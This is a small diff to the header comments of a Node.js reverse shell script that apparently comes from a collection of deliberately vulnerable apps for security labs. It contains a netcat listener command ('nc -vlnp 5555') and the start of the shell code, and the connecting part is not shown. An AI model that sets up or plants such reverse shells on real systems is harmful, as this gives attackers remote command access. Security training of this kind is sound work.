@@ -1,6 +1,6 @@
 // Original: https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell
-// Nodejs reverse shell
-// listen with: nc -vlnp 5555
+// this works in linux OS as the original, but is generalized by the which command
+// Nodejs reverse shell, listen with: nc -vlnp 5555
 
 (function () {
   var net = require("net"),
